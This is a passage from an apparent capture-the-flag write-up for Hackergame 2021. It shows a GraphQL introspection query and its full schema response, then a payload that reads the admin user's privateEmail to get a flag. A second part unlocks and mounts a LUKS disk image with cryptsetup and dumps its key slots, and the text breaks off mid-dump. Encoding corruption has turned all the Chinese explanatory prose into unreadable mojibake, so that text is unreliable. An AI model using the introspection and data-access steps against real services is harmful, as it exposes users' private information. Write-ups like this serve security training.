IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description args{...InputValue}onOperation onFragment onField}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name}}}} å¾—åˆ° {\"data\":{\"__schema\":{\"queryType\":{\"name\":\"Query\"},\"mutationType\":null,\"subscriptionType\":null,\"types\":[{\"kind\":\"OBJECT\",\"name\":\"Query\",\"description\":null,\"fields\":[{\"name\":\"note\",\"description\":\"Get a specific note information\",\"args\":[{\"name\":\"id\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"defaultValue\":\"null\"}],\"type\":{\"kind\":\"OBJECT\",\"name\":\"GNote\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"notes\",\"description\":\"Get notes information of a user\",\"args\":[{\"name\":\"userId\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"defaultValue\":\"null\"}],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"GNote\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"user\",\"description\":\"Get a specific user information\",\"args\":[{\"name\":\"id\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"defaultValue\":\"null\"}],\"type\":{\"kind\":\"OBJECT\",\"name\":\"GUser\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"GNote\",\"description\":null,\"fields\":[{\"name\":\"id\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"contents\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"SCALAR\",\"name\":\"Int\",\"description\":\"The `Int` scalar type represents non-fractional signed whole numeric values. Int can represent values between -(2^31) and 2^31 - 1.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"SCALAR\",\"name\":\"String\",\"description\":\"The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"GUser\",\"description\":null,\"fields\":[{\"name\":\"id\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"username\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"privateEmail\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"description\":\"The `Boolean` scalar type represents `true` or `false`.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__Schema\",\"description\":\"A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations.\",\"fields\":[{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"types\",\"description\":\"A list of all types supported by this server.\",\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"queryType\",\"description\":\"The type that query operations will be rooted at.\",\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"mutationType\",\"description\":\"If this server supports mutation, the type that mutation operations will be rooted at.\",\"args\":[],\"type\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"subscriptionType\",\"description\":\"If this server support subscription, the type that subscription operations will be rooted at.\",\"args\":[],\"type\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"directives\",\"description\":\"A list of all directives supported by this server.\",\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Directive\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"description\":\"The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\\n\\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name, description and optional `specifiedByUrl`, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types.\",\"fields\":[{\"name\":\"kind\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"ENUM\",\"name\":\"__TypeKind\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"specifiedByUrl\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"fields\",\"description\":null,\"args\":[{\"name\":\"includeDeprecated\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null},\"defaultValue\":\"false\"}],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Field\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"interfaces\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"possibleTypes\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"enumValues\",\"description\":null,\"args\":[{\"name\":\"includeDeprecated\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null},\"defaultValue\":\"false\"}],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__EnumValue\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"inputFields\",\"description\":null,\"args\":[{\"name\":\"includeDeprecated\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null},\"defaultValue\":\"false\"}],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__InputValue\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ofType\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"ENUM\",\"name\":\"__TypeKind\",\"description\":\"An enum describing what kind of type a given `__Type` is.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":[{\"name\":\"SCALAR\",\"description\":\"Indicates this type is a scalar.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"OBJECT\",\"description\":\"Indicates this type is an object. `fields` and `interfaces` are valid fields.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INTERFACE\",\"description\":\"Indicates this type is an interface. `fields`, `interfaces`, and `possibleTypes` are valid fields.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"UNION\",\"description\":\"Indicates this type is a union. `possibleTypes` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ENUM\",\"description\":\"Indicates this type is an enum. `enumValues` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INPUT_OBJECT\",\"description\":\"Indicates this type is an input object. `inputFields` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"LIST\",\"description\":\"Indicates this type is a list. `ofType` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"NON_NULL\",\"description\":\"Indicates this type is a non-null. `ofType` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null}],\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__Field\",\"description\":\"Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type.\",\"fields\":[{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"args\",\"description\":null,\"args\":[{\"name\":\"includeDeprecated\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null},\"defaultValue\":\"false\"}],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__InputValue\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"type\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"isDeprecated\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"deprecationReason\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__InputValue\",\"description\":\"Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value.\",\"fields\":[{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"type\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"defaultValue\",\"description\":\"A GraphQL-formatted string representing the default value for this input value.\",\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"isDeprecated\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"deprecationReason\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__EnumValue\",\"description\":\"One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string.\",\"fields\":[{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"isDeprecated\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"deprecationReason\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__Directive\",\"description\":\"A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document.\\n\\nIn some cases, you need to provide options to alter GraphQL's execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor.\",\"fields\":[{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"isRepeatable\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"locations\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"ENUM\",\"name\":\"__DirectiveLocation\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"args\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__InputValue\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"ENUM\",\"name\":\"__DirectiveLocation\",\"description\":\"A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":[{\"name\":\"QUERY\",\"description\":\"Location adjacent to a query operation.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"MUTATION\",\"description\":\"Location adjacent to a mutation operation.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"SUBSCRIPTION\",\"description\":\"Location adjacent to a subscription operation.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"FIELD\",\"description\":\"Location adjacent to a field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"FRAGMENT_DEFINITION\",\"description\":\"Location adjacent to a fragment definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"FRAGMENT_SPREAD\",\"description\":\"Location adjacent to a fragment spread.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INLINE_FRAGMENT\",\"description\":\"Location adjacent to an inline fragment.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"VARIABLE_DEFINITION\",\"description\":\"Location adjacent to a variable definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"SCHEMA\",\"description\":\"Location adjacent to a schema definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"SCALAR\",\"description\":\"Location adjacent to a scalar definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"OBJECT\",\"description\":\"Location adjacent to an object type definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"FIELD_DEFINITION\",\"description\":\"Location adjacent to a field definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ARGUMENT_DEFINITION\",\"description\":\"Location adjacent to an argument definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INTERFACE\",\"description\":\"Location adjacent to an interface definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"UNION\",\"description\":\"Location adjacent to a union definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ENUM\",\"description\":\"Location adjacent to an enum definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ENUM_VALUE\",\"description\":\"Location adjacent to an enum value definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INPUT_OBJECT\",\"description\":\"Location adjacent to an input object type definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INPUT_FIELD_DEFINITION\",\"description\":\"Location adjacent to an input object field definition.\",\"isDeprecated\":false,\"deprecationReason\":null}],\"possibleTypes\":null}],\"directives\":[{\"name\":\"include\",\"description\":\"Directs the executor to include this field or fragment only when the `if` argument is true.\",\"locations\":[\"FIELD\",\"FRAGMENT_SPREAD\",\"INLINE_FRAGMENT\"],\"args\":[{\"name\":\"if\",\"description\":\"Included when true.\",\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"defaultValue\":null}]},{\"name\":\"skip\",\"description\":\"Directs the executor to skip this field or fragment when the `if` argument is true.\",\"locations\":[\"FIELD\",\"FRAGMENT_SPREAD\",\"INLINE_FRAGMENT\"],\"args\":[{\"name\":\"if\",\"description\":\"Skipped when true.\",\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"defaultValue\":null}]},{\"name\":\"deprecated\",\"description\":\"Marks an element of a GraphQL schema as no longer supported.\",\"locations\":[\"FIELD_DEFINITION\",\"ARGUMENT_DEFINITION\",\"INPUT_FIELD_DEFINITION\",\"ENUM_VALUE\"],\"args\":[{\"name\":\"reason\",\"description\":\"Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formatted using the Markdown syntax, as specified by [CommonMark](https://commonmark.org/).\",\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"defaultValue\":\"\\\"No longer supported\\\"\"}]},{\"name\":\"specifiedBy\",\"description\":\"Exposes a URL that specifies the behaviour of this scalar.\",\"locations\":[\"SCALAR\"],\"args\":[{\"name\":\"url\",\"description\":\"The URL that specifies the behaviour of this scalar.\",\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"defaultValue\":null}]}]}}} ç„¶åå¯ä»¥å‘ç° email ç›¸å…³çš„æ˜¯ privateEmailï¼ŒæŸ¥è¯¢ç”¨æˆ·çš„è¯ç”¨ userï¼Œargs é‡Œç”¨ id: 1 æ¥æŸ¥ admin çš„ä¿¡æ¯ã€‚ payload: {\"query\":\"{ user(id: 1) { id\\nprivateEmail }}\"} æ‰“è¿‡å»å°±èƒ½æ‹¿åˆ° flag å•¦ï¼ Extensive Reading: 30åˆ†é’Ÿç†è§£GraphQLæ ¸å¿ƒæ¦‚å¿µ Hack In Paris 2019 CTF â€“ â€œMeet Your Doctorâ€ (GraphQL challenge) GraphQL injection ä¸€ä¸ªå·¥å…· GraphQLmap - a scripting engine to interact with a graphql endpoint for pentesting purposes. åŠ å¯†çš„ U ç›˜ è¿™æ˜¯ä¸€ä¸ªå…³äº LUKS (Linux Unified Key Setup) çš„æ•…äº‹ã€‚ ç¬¬ä¸€å¤© å° Tï¼šã€Œä½ è¦çš„éšæœºè¿‡ç¨‹çš„è¯¾ä»¶æˆ‘å¸®ä½ æ‹·å¥½äº†ï¼Œåœ¨è¿™ä¸ª U ç›˜é‡Œï¼ŒLUKS åŠ å¯†çš„å¯†ç æ˜¯ suijiguocheng123123ã€‚ã€ å° Zï¼šã€Œå•Šï¼Œä½ åˆæäº† Linux æ–‡ä»¶ç³»ç»ŸåŠ å¯†ï¼ŒçœŸæ‹¿ä½ æ²¡åŠæ³•ã€‚æˆ‘ç°åœ¨ä¸æ–¹ä¾¿ç”¨ Linuxï¼Œæˆ‘ç›´æ¥æŠŠè¿™å—ç›˜åšæˆç£ç›˜é•œåƒæ–‡ä»¶å†å›å»å¤„ç†å§ã€‚ã€ ç¬¬äºŒå¤© å° Zï¼šã€Œè°¢è°¢ä½ æ˜¨å¤©å¸®æˆ‘æ‹·çš„è¯¾ä»¶ã€‚ä½ æ¯æ¬¡éƒ½æè¿™ä¸ªåŠ å¯†ï¼Œå®ƒçœŸçš„å®‰å…¨å—ï¼Ÿã€ å° Tï¼šã€Œå½“ç„¶äº†ï¼ä½ çœ‹ï¼Œä½ è¿˜ç»™æˆ‘ä¹‹åï¼Œæˆ‘å·²ç»æŠŠè¿™å—ç›˜çš„å¼±å¯†ç æ”¹æ‰äº†ï¼Œç°åœ¨æ˜¯éšæœºç”Ÿæˆçš„å¼ºå¯†ç ï¼Œè¿™æ ·é™¤äº†æˆ‘è‡ªå·±ï¼Œä¸–ç•Œä¸Šä»»ä½•äººéƒ½æ— æ³•è§£å¯†å®ƒäº†ã€‚ã€ å° Zï¼šã€Œæˆ‘å¯ä¸ä¿¡ã€‚ã€ å° Tï¼šã€Œä½ ä¸ä¿¡ï¼Ÿä½ çœ‹ï¼Œæˆ‘ç°åœ¨å¾€ U ç›˜é‡Œæ”¾ä¸€ä¸ª flag æ–‡ä»¶ï¼Œç„¶åè¿™ä¸ª U ç›˜å°±ç»™ä½ äº†ï¼Œä½ ç»å¯¹è§£å¯†ä¸å‡ºæ¥è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚å½“åˆæ LUKS çš„æ—¶å€™æˆ‘å¯ç ”ç©¶äº†å¥½å‡ å¤©ï¼Œç­ä¸Šå¯æ²¡äººæ¯”æˆ‘æ›´æ‡‚åŠ å¯†ï¼ã€ æ”¾è¿› winhex é‡Œå¯ä»¥å‘ç°è¿™ä¿©æ–‡ä»¶éƒ½æ˜¯å®Œæ•´çš„ç£ç›˜é•œåƒï¼ŒåŒ…å« EFI ä¹‹ç±»çš„å¼•å¯¼æ‰‡åŒºï¼Œè€ŒååŒ…å«äº† LUKS åŠ å¯†åˆ†åŒºã€‚ å‚è€ƒ æ‰«ç›² dm-crypt â€” â€” å¤šåŠŸèƒ½ Linux ç£ç›˜åŠ å¯†å·¥å…·ï¼ˆå…¼å®¹ TrueCrypt &amp; VeraCryptï¼‰ å»å¹´ hackergame å®¤å‹çš„åŠ å¯†ç¡¬ç›˜ ä¸€é¢˜ ï¼ˆé‚£ä¸ªæ˜¯æå– AESKEYï¼Œä¸å¤§ä¸€æ · å…ˆæŠŠæˆ‘ä»¬éœ€è¦çš„è¿™ä¸¤ä¸ªæ–‡ä»¶çš„ LUKS åˆ†åŒºç»™å¯¼å‡ºæ¥ï¼Œåˆ†åˆ«ä¸º 1.001, 2.001. æˆ–è€…ç”¨ parted è·å– offsetï¼Œç„¶åæŒ‚è½½ loopã€‚ å‘ç°äºŒè€…çš„ UUID ç›¸åŒã€‚ ç„¶åç”¨ cryptsetup æŒ‚è½½ï¼Œçœ‹çœ‹æƒ…å†µã€‚day1 çš„å¯†é’¥å°±æ˜¯é¢˜ç›®ç»™çš„ suijiguocheng123123ã€‚ # cryptsetup luksOpen 1.001 day1 # cryptsetup status day1 /dev/mapper/day1 is active. type: LUKS2 cipher: aes-xts-plain64 keysize: 512 bits key location: keyring device: /dev/loop0 loop: /mnt/hgfs/games/Hackergame2021USTC/lukspwd/1.001 sector size: 512 offset: 32768 sectors size: 6111 sectors mode: readonly # mkdir /mnt/day1 # mount /dev/mapper/day1 /mnt/day1 mount: /mnt/day1: WARNING: source write-protected, mounted read-only. # df -hT æ–‡ä»¶ç³»ç»Ÿ ç±»å‹ å®¹é‡ å·²ç”¨ å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹ udev devtmpfs 1.4G 0 1.4G 0% /dev tmpfs tmpfs 293M 1.9M 291M 1% /run /dev/sda1 ext4 39G 23G 14G 62% / tmpfs tmpfs 1.5G 0 1.5G 0% /dev/shm tmpfs tmpfs 5.0M 0 5.0M 0% /run/lock vmhgfs-fuse fuse.vmhgfs-fuse 256G 245G 12G 96% /mnt/hgfs tmpfs tmpfs 293M 64K 293M 1% /run/user/0 /dev/mapper/day1 ext4 2.0M 33K 1.7M 2% /mnt/day1 # cd /mnt/day1/ # ll æ€»ç”¨é‡ 31K -rw-r--r-- 1 root root 19K 10æœˆ 18 23:52 éšæœºè¿‡ç¨‹.txt drwx------ 2 root root 12K 10æœˆ 18 23:52 lost+found çœ‹ä¸€ä¸‹ä¸¤ä¸ªç›˜é‡Œçš„ Key Slot # cryptsetup luksDump 1.001 LUKS header information Version: 2 Epoch: 3 Metadata area: 16384 [bytes] Keyslots area: 16744448 [bytes] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 Label: (no label) Subsystem: (no subsystem) Flags: (no flags) Data segments: 0: crypt offset: 16777216 [bytes] length: (whole device) cipher: aes-xts-plain64 sector: 512 [bytes] Keyslots: 0: luks2 Key: 512 bits Priority: normal Cipher: aes-xts-plain64 Cipher key: 512 bits PBKDF: pbkdf2 Hash: sha256 Iterations: 1581562 Salt: b6 95 26 1a d3 8d bb 51 fb 78 c2 1b 87 6b 9f 5a 66 10 4c 01 8f ae eb 30 53 c4 93 03 fd 1a 68 d6 AF stripes: 4000 AF hash: sha256 Area offset:32768 [bytes] Area length:258048 [bytes] Digest ID: 0 Tokens: Digests: 0: pbkdf2 Hash: sha256 Iterations: 104857 Salt: 3c f9 97 83 b9 08 0e b0 c8 ee b5 cc 63 f1 79 1f 1f df a5 11 cc 6e 48 53 b9 04 24 36 a4 4b 8d 55 Digest: 67 59 6a 45 a1 a1 6a 8e 09 75 71 5c b6 3c 83 9f 6c 00 ad d0 a4 df fe 9a 13 01 70 f8 de 03 a2 2b # cryptsetup luksDump 2.001 LUKS header information Version: 2 Epoch: 5 Metadata area: 16384 [bytes] Keyslots area: 16744448 [bytes] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 Label: (no label) Subsystem: (no subsystem) Flags: (no flags) Data segments: 0: crypt offset: 16777216 [bytes] length: (whole device) cipher: aes-xts-plain64 sector: 512 [bytes] Keyslots: 1: luks2 Key: 512 bits Priority: normal Cipher: aes-xts-plain64 Cipher key: 512 bits PBKDF: pbkdf2 Hash: sha256 Iterations: 1615678 Salt: d7 da 36 0c 04 52 0d 52 7a cc 3b 6a 33 14 5c d9 ed ff 5d 